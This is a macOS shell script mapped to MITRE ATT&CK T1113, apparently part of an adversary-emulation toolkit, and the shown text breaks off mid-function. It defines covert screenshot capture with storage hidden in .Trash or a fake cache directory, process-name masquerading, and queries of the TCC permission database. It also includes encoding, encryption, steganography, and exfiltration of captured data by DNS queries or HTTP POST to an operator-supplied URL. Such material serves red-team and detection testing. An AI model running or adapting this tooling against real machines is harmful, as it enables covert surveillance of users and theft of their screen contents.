#!/bin/sh
# POSIX-compliant shell script - avoid bashisms
# Script Name: 1113_screen_capture.sh
# MITRE ATT&CK Technique: 1113
# Author: @darmado | https://x.com/darmad0
# Date: 2025-05-28
# Version: 1.0.0

# Description:
# Capture screenshots of the desktop for reconnaissance and data collection
# MITRE ATT&CK Tactic: Collection
# Procedure GUID: 12345678-1234-5678-9abc-123456789013
# Generated from YAML procedure definition using build_procedure.py
# The script uses native macOS commands and APIs for maximum compatibility.

#------------------------------------------------------------------------------
# Configuration Section
#------------------------------------------------------------------------------

# MITRE ATT&CK Mappings
TACTIC="Discovery" #replace with you coresponding tactic
TTP_ID="T1082" #replace with you coresponding ttp_id
SUBTECHNIQUE_ID=""

TACTIC_ENCRYPT="Defense Evasion" # DO NOT MODIFY
TTP_ID_ENCRYPT="T1027" # DO NOT MODIFY
TACTIC_ENCODE="Defense Evasion" # DO NOT MODIFY
TTP_ID_ENCODE="T1140" # DO NOT MODIFY
TTP_ID_ENCODE_BASE64="T1027.001" # DO NOT MODIFY
TTP_ID_ENCODE_HEX="T1027" # DO NOT MODIFY
TTP_ID_ENCODE_PERL="T1059.006" # DO NOT MODIFY
TTP_ID_ENCODE_PERL_UTF8="T1027.010" # DO NOT MODIFY
TACTIC_STEG="Defense Evasion" # DO NOT MODIFY
TTP_ID_STEG="T1027.013" # DO NOT MODIFY
TTP_ID_ENCRYPT_XOR="T1027.007" # DO NOT MODIFY

# Add a unique job ID for tracking
JOB_ID=""  # Will be set after core functions are defined

# Script Information
NAME="1113_screen_capture"
SCRIPT_CMD="$0 $*"
SCRIPT_STATUS="running"
OWNER="$USER"
PARENT_PROCESS="$(ps -p $PPID -o comm=)"

# Core Commands
CMD_BASE64="base64"
CMD_BASE64_OPTS=""  # macOS base64 doesn't use -w option
CMD_CURL="curl"
CMD_CURL_OPTS="-L -s -X POST"
CMD_CURL_SECURITY="--fail-with-body --insecure"
CMD_CURL_TIMEOUT="--connect-timeout 5 --max-time 10 --retry 1 --retry-delay 0"
CMD_DATE="date"
CMD_DATE_OPTS="+%Y-%m-%d %H:%M:%S"  # Fixed for macOS compatibility
CMD_DEFAULTS="defaults"
CMD_DIG="dig"
CMD_DIG_OPTS="+short"
CMD_FIND="find"
CMD_LAUNCHCTL="launchctl"
CMD_OPENSSL="openssl"
CMD_PKGUTIL="pkgutil"
CMD_PRINTF="printf"
CMD_SPCTL="spctl"
CMD_SYSTEM_PROFILER="system_profiler"
CMD_XXD="xxd"
CMD_PERL="perl"
CMD_PS="ps"
CMD_LOGGER="logger"
CMD_AWK="awk"
CMD_SED="sed"
CMD_GREP="grep"
CMD_TR="tr"
CMD_HEAD="head"
CMD_TAIL="tail"
CMD_SLEEP="sleep"
CMD_GPG="gpg"
CMD_GPG_OPTS="--batch --yes --symmetric --cipher-algo AES256 --armor"
CMD_STRINGS="strings"
CMD_HOST="host"
CMD_NSLOOKUP="nslookup"
CMD_HOSTNAME="hostname"
CMD_STAT="stat"
CMD_SQLITE3="sqlite3"
CMD_MKDIR="mkdir"
CMD_MV="mv"
CMD_CP="cp"
CMD_LS="ls"
CMD_WHOAMI="whoami"
CMD_ID="id"
CMD_WC="wc"
CMD_CAT="cat"
CMD_LSOF="lsof"

# Logging Settings
HOME_DIR="${HOME}"
LOG_DIR="./logs"  # Simple path to logs in current directory
LOG_FILE_NAME="${TTP_ID}_${NAME}.log"
LOG_MAX_SIZE=$((5 * 1024 * 1024))  # 5MB
LOG_ENABLED=false
SYSLOG_TAG="${NAME}"

# Default settings
DEBUG=false
ALL=false
SHOW_HELP=false
STEG_TRANSFORM=false # Enable steganography transformation
STEG_EXTRACT=false # Extract hidden data from steganography
STEG_EXTRACT_FILE="" # File to extract hidden data from

# OPSEC Check Settings (enabled by build script based on YAML configuration)
CHECK_PERMS="false"
CHECK_FDA="false"
CHECK_DB_LOCK="false"

SCREENSHOT=false
DISPLAY=false
LIST_WINDOWS=false
WINDOW_ID=false
BROWSER_WINDOWS=false
APP_WINDOWS=false
HIDDEN=false
MASQUERADE=false
CACHE=false
OSASCRIPT=false
SWIFT=false
PYTHON=false
TCC_QUERY=false
PROCESS_SCAN=false
TCC_PROXY=false
ALL_METHODS=false

SCREENSHOT_PATH="/tmp/ss.jpg"
HIDDEN_DIR="$HOME/.Trash/.ss"
CACHE_DIR="$HOME/Library/Caches/com.apple.screencapture"

# MITRE ATT&CK Mappings
TACTIC="Discovery" #replace with your corresponding tactic
TTP_ID="T1082" #replace with your corresponding ttp_id
SUBTECHNIQUE_ID=""

TACTIC_ENCRYPT="Defense Evasion" # DO NOT MODIFY
TTP_ID_ENCRYPT="T1027" # DO NOT MODIFY
TACTIC_ENCODE="Defense Evasion" # DO NOT MODIFY
TTP_ID_ENCODE="T1140" # DO NOT MODIFY
TTP_ID_ENCODE_BASE64="T1027.001" # DO NOT MODIFY
TTP_ID_ENCODE_HEX="T1027" # DO NOT MODIFY
TTP_ID_ENCODE_PERL="T1059.006" # DO NOT MODIFY
TTP_ID_ENCODE_PERL_UTF8="T1027.010" # DO NOT MODIFY

# Output Configuration
FORMAT=""          # json, csv, or empty for raw
JSON_WRAP_LINES=true # Whether to wrap each line in quotes in JSON
JSON_DETECT_NUMBERS=true # Try to detect numbers in JSON
ENCODE="none"      # base64, hex, perl_b64, perl_utf8
ENCRYPT="none"     # aes, gpg, none
EXFIL=false
EXFIL_METHOD=""
EXFIL_URI=""
EXFIL_START=""
EXFIL_END=""
CHUNK_SIZE=50      # Default chunk size for DNS exfiltration (bytes)
PROXY_URL=""       # Proxy URL for HTTP/HTTPS operations
ENCODING_TYPE="none"
ENCRYPTION_TYPE="none"
EXFIL_TYPE="none"

# TCC Database Paths
TCC_SYSTEM_DB="/Library/Application Support/com.apple.TCC/TCC.db"
TCC_USER_DB="$HOME/Library/Application Support/com.apple.TCC/TCC.db"

# Default Steganography Carrier Image
DEFAULT_STEG_CARRIER="/System/Library/Desktop Pictures/Monterey Graphic.heic"

#------------------------------------------------------------------------------
# CORE FUNCTIONS FROM base.sh
#------------------------------------------------------------------------------
# NOTE: All core functions are prefixed with 'core_' to avoid namespace conflicts
# with script-specific functions. When creating scripts that source this file,
# use your own function names to prevent collisions.

# Purpose: Get the current timestamp in a consistent format
# Inputs: None
# Outputs: Timestamp string in "YYYY-MM-DD HH:MM:SS" format
# Side Effects: None
core_get_timestamp() {
    # Use direct command to avoid variable expansion issues
    date "+%Y-%m-%d %H:%M:%S"
}

# Purpose: Generate a unique job ID for tracking script execution
# Inputs: None
# Outputs: 8-character hexadecimal job ID
# Side Effects: None
core_generate_job_id() {
    # Use openssl to generate random hex string for job tracking
    # Fallback to date-based ID if openssl not available
    if command -v "$CMD_OPENSSL" > /dev/null 2>&1; then
        $CMD_OPENSSL rand -hex 4 2>/dev/null || {
            # Fallback: use timestamp and process ID
            $CMD_PRINTF "%08x" "$(($(date +%s) % 4294967296))"
        }
    else
        # Fallback: use timestamp and process ID
        $CMD_PRINTF "%08x" "$(($(date +%s) % 4294967296))"
    fi
}

# Purpose: Print debug messages to stderr when debug mode is enabled
# Inputs: $1 - Message to print
# Outputs: None (prints directly to stderr)
# Side Effects: Writes to stderr if DEBUG=true
core_debug_print() {
    if [ "$DEBUG" = true ]; then
        local timestamp=$(core_get_timestamp)
        $CMD_PRINTF "[DEBUG] [%s] %s\n" "$timestamp" "$1" >&2
    fi
}

# Purpose: Print verbose messages to stdout when verbose mode is enabled
# Inputs: $1 - Message to print
# Outputs: None (prints directly to stdout)
# Side Effects: Writes to stdout if VERBOSE=true

# Purpose: Handle errors consistently with proper formatting and logging
# Inputs: $1 - Error message
# Outputs: None (prints directly to stderr)
# Side Effects: 
#   - Writes to stderr
#   - Logs error message if LOG_ENABLED=true
#   - Returns error code 1
core_handle_error() {
    local error_msg="$1"
    local timestamp=$(core_get_timestamp)
    $CMD_PRINTF "[ERROR] [%s] %s\n" "$timestamp" "$error_msg" >&2
    
    if [ "$LOG_ENABLED" = true ]; then
        core_log_output "$error_msg" "error" false
    fi
    
    return 1
}

# Purpose: Log output to the log file with automatic rotation and consistent formatting
# Inputs: 
#   $1 - Output data to log
#   $2 - Status type (info, error, etc.), defaults to "info"
#   $3 - Skip data flag (true/false), defaults to false
# Outputs: None
# Side Effects:
#   - Creates log directory if it doesn't exist
#   - Writes to log file if LOG_ENABLED=true
#   - Rotates log file if size exceeds LOG_MAX_SIZE
#   - Writes to syslog with logger
#   - Writes to stdout if DEBUG or VERBOSE is true
core_log_output() {
    local output="$1"
    local status="${2:-info}"
    local skip_data="${3:-false}"
    
    if [ "$LOG_ENABLED" = true ]; then
        # Ensure log directory exists
        if [ ! -d "$LOG_DIR" ]; then
            $CMD_MKDIR -p "$LOG_DIR" 2>/dev/null || {
                $CMD_PRINTF "Warning: Failed to create log directory.\n" >&2
                return 1
            }
        fi
        
        # Check log size and rotate if needed
        if [ -f "$LOG_DIR/$LOG_FILE_NAME" ] && [ "$($CMD_STAT -f%z "$LOG_DIR/$LOG_FILE_NAME" 2>/dev/null || "$CMD_PRINTF" 0)" -gt "$LOG_MAX_SIZE" ]; then
            $CMD_MV "$LOG_DIR/$LOG_FILE_NAME" "$LOG_DIR/${LOG_FILE_NAME}.$(date +%Y%m%d%H%M%S)" 2>/dev/null
            core_debug_print "Log file rotated due to size limit"
        fi
        
        # Log detailed entry
        "$CMD_PRINTF" "[%s] [%s] [PID:%d] [job:%s] owner=%s parent=%s ttp_id=%s tactic=%s format=%s encoding=%s encryption=%s exfil=%s status=%s\\n" \
            "$(core_get_timestamp)" \
            "$status" \
            "$$" \
            "${JOB_ID:-NOJOB}" \
            "$OWNER" \
            "$PARENT_PROCESS" \
            "$TTP_ID" \
            "$TACTIC" \
            "${FORMAT:-raw}" \
            "$ENCODING_TYPE" \
            "${ENCRYPTION_TYPE:-none}" \
            "${EXFIL_TYPE:-none}" >> "$LOG_DIR/$LOG_FILE_NAME"
            
        if [ "$skip_data" = "false" ] && [ -n "$output" ]; then
            "$CMD_PRINTF" "command: %s\\ndata:\\n%s\\n---\\n" \
                "$SCRIPT_CMD" \
                "$output" >> "$LOG_DIR/$LOG_FILE_NAME"
        else
            "$CMD_PRINTF" "command: %s\\n---\\n" \
                "$SCRIPT_CMD" >> "$LOG_DIR/$LOG_FILE_NAME"
        fi

        # Also log to syslog
        $CMD_LOGGER -t "$SYSLOG_TAG" "job=${JOB_ID:-NOJOB} status=$status ttp_id=$TTP_ID tactic=$TACTIC exfil=${EXFIL_TYPE:-none} encoding=$ENCODING_TYPE encryption=${ENCRYPTION_TYPE:-none} cmd=\"$SCRIPT_CMD\""
    fi
    
    # Output to stdout if in debug mode only
    if [ "$DEBUG" = true ]; then
        $CMD_PRINTF "[%s] [%s] %s\\n" "$(core_get_timestamp)" "$status" "$output"
    fi
}

#Purpose: Validate input strings for security and format compliance
#Inputs: 
#  $1 - Input string to validate
#  $2 - Validation type (string|integer|domain|url|file_path)
#Outputs: 0 if valid, 1 if invalid
#Side Effects: Prints error message to stderr on validation failure
core_validate_input() {
    local input="$1"
    local validation_type="$2"
    
    # Check for empty input
    if [ -z "$input" ]; then
        core_handle_error "Empty input not allowed for type: $validation_type"
        return 1
    fi
    
    case "$validation_type" in
        "string")
            # Allow alphanumeric, spaces, hyphens, underscores, dots
            if "$CMD_PRINTF" "$input" | $CMD_GREP -q '[^a-zA-Z0-9 ._-]'; then
                core_handle_error "Invalid characters in string input: $input"
                return 1
            fi
            ;;
        "string_special")
            # For search terms and special input, just escape for SQL safety
            # Don't block legitimate characters - only handle actual security risks
            
            # Check for null bytes (actual security risk) using a simpler approach
    case "$input" in
                *$'\0'*)
                    core_handle_error "Null bytes not allowed in input: $input"
                    return 1
                    ;;
            esac
            
            # For SQL contexts, the calling function should handle escaping
            # We don't need to block legitimate characters here
            core_debug_print "Input validation passed for: $input"
            ;;
        "integer")
            # Must be a positive integer
            if ! "$CMD_PRINTF" "$input" | $CMD_GREP -q '^[0-9]\+$'; then
                core_handle_error "Invalid integer input: $input"
                return 1
            fi
            ;;
        "domain")
            # Basic domain format validation
            if ! "$CMD_PRINTF" "$input" | $CMD_GREP -q '^[a-zA-Z0-9][a-zA-Z0-9.-]*[a-zA-Z0-9]$'; then
                core_handle_error "Invalid domain format: $input"
                return 1
            fi
            ;;
        "url")
            # Basic URL format validation
            if ! "$CMD_PRINTF" "$input" | $CMD_GREP -q '^https\?://[a-zA-Z0-9][a-zA-Z0-9.-]*'; then
                core_handle_error "Invalid URL format: $input"
                return 1
            fi
            ;;
        "file_path")
            # Basic file path validation - no null bytes, reasonable length
            if "$CMD_PRINTF" "$input" | $CMD_GREP -q $'\0' || [ ${#input} -gt 4096 ]; then
                core_handle_error "Invalid file path: $input"
                return 1
            fi
            ;;
        *)
            core_handle_error "Unknown validation type: $validation_type"
            return 1
            ;;
    esac
    
    return 0
}

# Purpose: Extract domain from URL for validation
# Inputs: $1 - URL string
# Outputs: Domain part of URL
# Side Effects: None
core_extract_domain_from_url() {
    local url="$1"
    "$CMD_PRINTF"  "$url" | sed -E 's~^https?://([^/:]+).*~\1~'
}

# Purpose: Validate that essential commands are available before script execution
# Inputs: None
# Outputs: None
# Side Effects:
#   - Returns 1 if any essential command is missing
#   - Calls core_handle_error on missing commands
core_validate_command() {
    local missing=""
    
    # Only check commands base.sh always needs
    for cmd in date printf; do
        if ! command -v "$cmd" > /dev/null 2>&1; then
            missing="$missing $cmd"
        fi
    done
    
    if [ -n "$missing" ]; then
        core_handle_error "Missing essential commands:$missing"
        return 1
    fi
    
    return 0
}

# Purpose: Check if a domain resolves to a valid IP address
# Inputs: $1 - Domain to check
# Outputs: 0 if domain resolves, 1 if not
# Side Effects: Prints error message if domain doesn't resolve
core_validate_domain() {
    local domain="$1"
    
    # Skip empty domains
    [ -z "$domain" ] && return 0
    
    # Skip IP addresses
    if "$CMD_PRINTF"  "$domain" | $CMD_GREP -E '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$' > /dev/null; then
        return 0
    fi
    
    # Try DNS resolution with fallback tools - assume commands exist
    local resolved=""
    
        resolved=$($CMD_DIG $CMD_DIG_OPTS "$domain" A 2>/dev/null)
        if [ -n "$resolved" ]; then
            return 0
        fi
    
        resolved=$($CMD_HOST "$domain" 2>/dev/null | $CMD_GREP "has address" | $CMD_HEAD -1)
        if [ -n "$resolved" ]; then
            return 0
        fi
    
        resolved=$($CMD_NSLOOKUP "$domain" 2>/dev/null | $CMD_GREP "Address:" | $CMD_GREP -v "#53" | $CMD_HEAD -1)
        if [ -n "$resolved" ]; then
            return 0
        fi
    
    core_handle_error "Domain does not resolve: $domain"
    return 1
}

# Purpose: Parse command-line arguments and set global variables (NO VALIDATION)
# Inputs: $@ - All command-line arguments passed to the script
# Outputs: None
# Side Effects: Sets global flag variables based on command-line options
core_parse_args() {
    # Track unknown arguments and missing values for error reporting
    UNKNOWN_ARGS=""
    MISSING_VALUES=""
    
    while [ "$#" -gt 0 ]; do
        case "$1" in
            -h|--help)
                SHOW_HELP=true
                ;;
            -d|--debug)
                DEBUG=true
                ;;
            -l|--log)
                LOG_ENABLED=true
                ;;
            --format|--output-format)
                if [ -n "$2" ] && [ "$2" != "${2#-}" ]; then
                    # Next arg starts with -, so no value provided
                    MISSING_VALUES="$MISSING_VALUES $1"
                elif [ -n "$2" ]; then
                    FORMAT="$2"
                    shift
                else
                    MISSING_VALUES="$MISSING_VALUES $1"
                fi
                ;;
            --encode)
                if [ -n "$2" ] && [ "$2" != "${2#-}" ]; then
                    MISSING_VALUES="$MISSING_VALUES $1"
                elif [ -n "$2" ]; then
                    ENCODE="$2"
                    ENCODING_TYPE="$2"
                    shift
                else
                    MISSING_VALUES="$MISSING_VALUES $1"
                fi
                ;;
            --encrypt)
                if [ -n "$2" ] && [ "$2" != "${2#-}" ]; then
                    MISSING_VALUES="$MISSING_VALUES $1"
                elif [ -n "$2" ]; then
                    ENCRYPT="$2"
                    ENCRYPTION_TYPE="$2"
                    shift
                else
                    MISSING_VALUES="$MISSING_VALUES $1"
                fi
                ;;
            --exfil-dns)
                if [ -n "$2" ] && [ "$2" != "${2#-}" ]; then
                    MISSING_VALUES="$MISSING_VALUES $1"
                elif [ -n "$2" ]; then
                        EXFIL=true
                        EXFIL_METHOD="dns"
                        EXFIL_TYPE="dns"
                        EXFIL_URI="$2"
                    shift
                    else
                    MISSING_VALUES="$MISSING_VALUES $1"
                fi
                ;;
            --exfil-http)
                if [ -n "$2" ] && [ "$2" != "${2#-}" ]; then
                    MISSING_VALUES="$MISSING_VALUES $1"
                elif [ -n "$2" ]; then
                        EXFIL=true
                        EXFIL_METHOD="http"
                        EXFIL_TYPE="http"
                        EXFIL_URI="$2"
                    shift
                    else
                    MISSING_VALUES="$MISSING_VALUES $1"
                fi
                ;;
            --exfil-uri)
                if [ -n "$2" ] && [ "$2" != "${2#-}" ]; then
                    MISSING_VALUES="$MISSING_VALUES $1"
                elif [ -n "$2" ]; then
                            EXFIL=true
                            EXFIL_TYPE="uri"
                            EXFIL_URI="$2"
                    # Determine method based on URI format (will be validated later)
                    if "$CMD_PRINTF"  "$2" | $CMD_GREP -q "^http"; then
                            EXFIL_METHOD="http"
                        else
                        EXFIL_METHOD="dns"
                    fi
                    shift
                else
                    MISSING_VALUES="$MISSING_VALUES $1"
                fi
                ;;
            --chunk-size)
                if [ -n "$2" ] && [ "$2" != "${2#-}" ]; then
                    MISSING_VALUES="$MISSING_VALUES $1"
                elif [ -n "$2" ]; then
                    CHUNK_SIZE="$2"
                    shift
                else
                    MISSING_VALUES="$MISSING_VALUES $1"
                fi
                ;;
            --proxy)
                if [ -n "$2" ] && [ "$2" != "${2#-}" ]; then
                    MISSING_VALUES="$MISSING_VALUES $1"
                elif [ -n "$2" ]; then
                    PROXY_URL="$2"
                    shift
                else
                    MISSING_VALUES="$MISSING_VALUES $1"
                fi
                ;;
            --steganography)
                STEG_TRANSFORM=true
                ;;
            --steg-extract)
                STEG_EXTRACT=true
                if [ -n "$2" ] && [ ! "$2" = "${2#-}" ]; then
                    STEG_EXTRACT_FILE="./hidden_data.png"
                elif [ -n "$2" ]; then
                    STEG_EXTRACT_FILE="$2"
                    shift
                else
                    STEG_EXTRACT_FILE="./hidden_data.png"
                fi
                ;;
# We need to  accomidate the unknown rgs condiuton for the new args we add from the yaml
        -s|--screenshot)
            SCREENSHOT=true
            ;;
        -d|--display)
            DISPLAY=true
            ;;
        --list-windows)
            LIST_WINDOWS=true
            ;;
        --window-id)
            WINDOW_ID=true
            ;;
        --browser-windows)
            BROWSER_WINDOWS=true
            ;;
        --app-windows)
            APP_WINDOWS=true
            ;;
        --hidden)
            HIDDEN=true
            ;;
        --masquerade)
            MASQUERADE=true
            ;;
        --cache)
            CACHE=true
            ;;
        --osascript)
            OSASCRIPT=true
            ;;
        --swift)
            SWIFT=true
            ;;
        --python)
            PYTHON=true
            ;;
        --tcc-query)
            TCC_QUERY=true
            ;;
        --process-scan)
            PROCESS_SCAN=true
            ;;
        --tcc-proxy)
            TCC_PROXY=true
            ;;
        -a|--all-methods)
            ALL_METHODS=true
            ;;
            *)
                # Collect unknown arguments for error reporting
                if [ -z "$UNKNOWN_ARGS" ]; then
                    UNKNOWN_ARGS="$1"
                else
                    UNKNOWN_ARGS="$UNKNOWN_ARGS $1"
                fi
                ;;
        esac
        shift
    done
    
    core_debug_print "Arguments parsed: DEBUG=$DEBUG, FORMAT=$FORMAT, ENCODE=$ENCODE, ENCRYPT=$ENCRYPT"
    
    # Report unknown arguments as warnings but don't exit
    if [ -n "$UNKNOWN_ARGS" ]; then
        "$CMD_PRINTF"  "[WARNING] [%s] Unknown arguments: %s\n" "$(core_get_timestamp)" "$UNKNOWN_ARGS" >&2
    fi
    
    # Report missing values as warnings but don't exit
    if [ -n "$MISSING_VALUES" ]; then
        "$CMD_PRINTF"  "[WARNING] [%s] Arguments missing required values: %s\n" "$(core_get_timestamp)" "$MISSING_VALUES" >&2
    fi
}

# Display help message
core_display_help() {
    cat << EOF
Usage: ${0##*/} [OPTIONS]

Description: Base script for ATT&CK macOS techniques
MITRE ATT&CK: ${TTP_ID} - ${TACTIC}

Basic Options:
  -h, --help           Display this help message
  -d, --debug          Enable debug output (includes verbose output)
  -a, --all            Process all available data (technique-specific)
  -s|--screenshot           Capture a silent screenshot
  -d|--display              Capture screenshot and display info
  --list-windows            List available windows for targeted screenshot capture
  --window-id               Capture screenshot of specific window by ID
  --browser-windows         Capture screenshots of all browser windows
  --app-windows             Capture screenshots of all application windows
  --hidden                  Capture screenshot with hidden storage in .Trash
  --masquerade              Capture screenshot using process name masquerading
  --cache                   Capture screenshot stored in realistic cache directory
  --osascript               Capture screenshot using osascript/AppleScript interpreter
  --swift                   Capture screenshot using Swift system commands
  --python                  Capture screenshot using Python system commands
  --tcc-query               Query TCC database for screen recording permissions
  --process-scan            Scan for processes that might have screen recording permissions
  --tcc-proxy               Find and use apps with existing screen recording permissions
  -a|--all-methods          Test ALL screenshot capture methods for maximum detection coverage

Output Options:
  --format TYPE        Output format: 
                        - json: Structured JSON output
                        - csv: Comma-separated values
                        - raw: Default pipe-delimited text

Encoding/Obfuscation Options:
  --encode TYPE        Encode output using:
                        - base64/b64: Base64 encoding using base64 command
                        - hex/xxd: Hexadecimal encoding using xxd command
                        - perl_b64: Perl Base64 implementation using perl
                        - perl_utf8: Perl UTF8 encoding using perl
  --steganography      Hide output in image file using native macOS tools
  --steg-extract [FILE] Extract hidden data from steganography image (default: ./hidden_data.png)

Encryption Options:
  --encrypt TYPE       Encrypt output using:
                        - aes: AES-256-CBC encryption using openssl command
                        - gpg: GPG symmetric encryption using gpg command
                        - xor: XOR encryption with cyclic key (custom implementation)

Exfiltration Options:
  --exfil-dns DOMAIN   Exfiltrate data via DNS queries using dig command
                        Data is automatically base64 encoded and chunked
  --exfil-http URL     Exfiltrate data via HTTP POST using curl command
                        Data is sent in the request body
  --exfil-uri URL      Legacy parameter - Exfiltrate via HTTP GET using curl
                        Data is automatically chunked to avoid URL length limits
  --chunk-size SIZE    Size of chunks for DNS/HTTP exfiltration (default: $CHUNK_SIZE bytes)
  --proxy URL          Use proxy for HTTP requests (format: protocol://host:port)

Notes:
- When using encryption with exfiltration, keys are automatically sent via DNS TXT records
- JSON output includes metadata about execution context
- Log files are automatically rotated when they exceed ${LOG_MAX_SIZE} bytes
- Exfiltration is enabled automatically when specifying any exfil method
- DNS exfiltration automatically chunks data and sends start/end signals
- Steganography uses native macOS image manipulation without external dependencies
EOF
}

# Purpose: Process raw output according to format, encoding, and encryption settings
# Inputs:
#   $1 - Raw output data to process
#   $2 - Data source identifier (defaults to "generic")
# Outputs: Processed output (formatted/encoded/encrypted as requested)
# Side Effects:
#   - May set global ENCODING_TYPE and ENCRYPTION_TYPE variables
core_process_output() {
    local output="$1"
    local data_source="${2:-generic}"
    local processed="$output"
    local is_encoded=false
    local is_encrypted=false
    local is_steganography=false
    
    # 1. Format the output first if requested
    if [ -n "$FORMAT" ]; then
        if [ "$FORMAT" = "json" ] || [ "$FORMAT" = "JSON" ]; then
            # For JSON, only use raw data here - we'll add transformation metadata at the end
            processed=$(core_format_output "$output" "$FORMAT" "$data_source" "false" "none" "false" "none" "false")
        else
            # For other formats, just format the raw output
            processed=$(core_format_output "$output" "$FORMAT" "$data_source")
        fi
        core_debug_print "Output formatted as $FORMAT"
    fi
    # 2. Apply encoding if requested (after formatting)
    if [ "$ENCODE" != "none" ]; then
        core_debug_print "Applying encoding: $ENCODE"
        processed=$(core_encode_output "$processed" "$ENCODE")
        is_encoded=true
    fi
    # 3. Apply encryption if requested (after encoding)
    if [ "$ENCRYPT" != "none" ]; then
        core_debug_print "Applying encryption: $ENCRYPT"
        processed=$(core_encrypt_output "$processed" "$ENCRYPT")
        is_encrypted=true
    fi
    
    # 4. Apply steganography if requested (after encryption)
    if [ "$STEG_TRANSFORM" = true ]; then
        core_debug_print "Applying steganography transformation"
        # Save the processed data to the steganography image
        local steg_result=$(core_apply_steganography "$processed")
        # Only set the output metadata, the actual file is written directly
        processed="$steg_result"
        is_steganography=true
    fi
    
    # 5. If JSON formatting was requested, add the final metadata about transformations
    if [ -n "$FORMAT" ] && [ "$FORMAT" = "json" ] || [ "$FORMAT" = "JSON" ]; then
        # We already formatted the output, but add the transformation metadata
        if [ "$is_encoded" = true ] || [ "$is_encrypted" = true ] || [ "$is_steganography" = true ]; then
            # Don't double-wrap in JSON, just return the processed data with transformation flags
            # The metadata about transformations is informational only for the user
            core_debug_print "Preserving encoded/encrypted data in output"
        fi
    fi
    
    $CMD_PRINTF "%s" "$processed"
}

# Purpose: Format output based on requested format (JSON, CSV, etc.)
# Inputs:
#   $1 - Output data to format
#   $2 - Format type (json, csv, or other for raw)
#   $3 - Data source identifier (defaults to "generic")
#   $4-7 - Additional parameters for JSON metadata
# Outputs: Formatted data
# Side Effects: None
core_format_output() {
    local output="$1"
    local format="$2"
    # Convert to lowercase using tr for sh compatibility
    format=$("$CMD_PRINTF" '%s' "$format" | tr '[:upper:]' '[:lower:]')
    local data_source="${3:-generic}"
    local is_encoded="${4:-false}"
    local encoding="${5:-none}"
    local is_encrypted="${6:-false}"
    local encryption="${7:-none}"
    local is_steganography="${8:-false}"
    local formatted="$output"
    
    case "$format" in
        json|json-lines)
            formatted=$(core_format_as_json "$output" "$data_source" "$is_encoded" "$encoding" "$is_encrypted" "$encryption" "$is_steganography")
            ;;
        csv)
            formatted=$(core_format_as_csv "$output")
            ;;
        *)
            # Keep as raw
            ;;
    esac
    
    $CMD_PRINTF "%s" "$formatted"
}

# Purpose: Convert output data to JSON format with metadata
# Inputs:
#   $1 - Output data to convert to JSON
#   $2 - Data source identifier
#   $3 - Whether data is encoded (true/false)
#   $4 - Encoding method
#   $5 - Whether data is encrypted (true/false)
#   $6 - Encryption method
#   $7 - Whether steganography is used (true/false)
# Outputs: JSON-formatted string with data and metadata
# Side Effects: None
core_format_as_json() {
    local output="$1"
    local data_source="${2:-generic}"
    local is_encoded="${3:-false}"
    local encoding="${4:-none}"
    local is_encrypted="${5:-false}"
    local encryption="${6:-none}"
    local is_steganography="${7:-false}"
    local json_output=""
    local timestamp=$(core_get_timestamp)
    
    # Create JSON structure - POSIX-compliant approach with direct string concatenation
    json_output="{"
    json_output="$json_output
  \"timestamp\": \"$timestamp\","
    json_output="$json_output
  \"command\": \"$SCRIPT_CMD\","
    json_output="$json_output
  \"jobId\": \"$JOB_ID\","
    json_output="$json_output
  \"dataSource\": \"$data_source\","
    
    # Always include encoding and encryption status
        json_output="$json_output
  \"encoding\": {"
    json_output="$json_output
    \"enabled\": $is_encoded,"
    json_output="$json_output
    \"method\": \"$encoding\"
  },"
    
        json_output="$json_output
  \"encryption\": {"
    json_output="$json_output
    \"enabled\": $is_encrypted,"
    json_output="$json_output
    \"method\": \"$encryption\"
  },"
  
    # Include steganography status
    json_output="$json_output
  \"steganography\": {"
    json_output="$json_output
    \"enabled\": $is_steganography,"
    if [ "$is_steganography" = true ] && [ -n "$STEG_OUTPUT_IMAGE" ]; then
        json_output="$json_output
    \"output\": \"$STEG_OUTPUT_IMAGE\""
    else
        json_output="$json_output
    \"output\": null"
    fi
    json_output="$json_output
  },"
    
    json_output="$json_output
  \"data\": ["
    
    # Process each line
    local line_count=0
    while IFS= read -r line || [ -n "$line" ]; do
        # Skip empty lines
        [ -z "$line" ] && continue
        
        # Add comma if not first line
        if [ $line_count -gt 0 ]; then
            json_output="$json_output,"
        fi
        
        # Escape special characters
        line=$("$CMD_PRINTF"  "$line" | sed 's/\\/\\\\/g; s/"/\\"/g')
        
        # Check if line is a number and JSON_DETECT_NUMBERS is true
        if [ "$JSON_DETECT_NUMBERS" = true ] && "$CMD_PRINTF"  "$line" | $CMD_GREP -E '^[0-9]+$' > /dev/null; then
            json_output="$json_output
      $line"
        else
            # Wrap in quotes for string
            json_output="$json_output
      \"$line\""
        fi
        
        line_count=$((line_count + 1))
    done <<< "$output"
    
    # Close JSON structure
    json_output="$json_output
    ]
}"
    
    # Output the JSON string directly
    $CMD_PRINTF "%s" "$json_output"
}

# Convert pipe-delimited output to CSV format
core_format_as_csv() {
    local output="$1"
    local csv_output=""
    
    # Process each line
    while IFS= read -r line || [ -n "$line" ]; do
        # Skip empty lines
        [ -z "$line" ] && continue
        
        # Replace pipe delimiters with commas
        csv_line=$("$CMD_PRINTF"  "$line" | sed 's/|/,/g')
        
        # Add to CSV output
        if [ -z "$csv_output" ]; then
            csv_output="$csv_line"
        else
            csv_output="${csv_output}\n$csv_line"
        fi
    done <<< "$output"
    
    # Output CSV directly
    $CMD_PRINTF "%s" "$csv_output"
}

# Purpose: Encode output using the specified encoding method
# Inputs:
#   $1 - Output data to encode
#   $2 - Encoding method (base64/b64, hex, perl_b64, perl_utf8)
# Outputs: Encoded data according to specified method
# Side Effects: None
core_encode_output() {
    local output="$1"
    local encode_type="$2"
    # Convert to lowercase using tr for sh compatibility
    encode_type=$("$CMD_PRINTF" '%s' "$encode_type" | tr '[:upper:]' '[:lower:]')
    local encoded=""
    
    case "$encode_type" in
        base64|b64)
            # Debug information
            core_debug_print "Encoding with base64"
            encoded=$("$CMD_PRINTF" '%s' "$output" | $CMD_BASE64)
            ;;
        hex)
            core_debug_print "Encoding with hex"
            encoded=$("$CMD_PRINTF" '%s' "$output" | $CMD_XXD -p | tr -d '\n')
            ;;
        perl_b64)
            core_debug_print "Encoding with perl base64"
            encoded=$("$CMD_PRINTF" '%s' "$output" | $CMD_PERL -MMIME::Base64 -e 'print encode_base64(<STDIN>);')
            ;;
        perl_utf8)
            core_debug_print "Encoding with perl utf8"
